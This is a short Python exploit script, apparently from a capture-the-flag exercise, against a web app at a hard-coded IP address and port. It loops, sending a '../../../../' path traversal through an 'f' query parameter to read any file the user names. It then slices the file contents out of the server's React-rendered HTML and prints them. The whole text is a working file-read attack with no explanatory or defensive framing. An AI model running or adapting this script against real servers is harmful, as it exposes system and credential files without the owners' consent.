import readline

import requests

if __name__ == "__main__":
    URL = "http://138.68.178.56:30843/?f=../../../../"

    while True:
        filepath = input("filepath: ")
        res = requests.get(URL + filepath)    
        text = res.text

        content = text.split('React.createElement("p", null, "')[1]
        content = content.split('"), /*#__PURE__*/')[0]

        print(content)
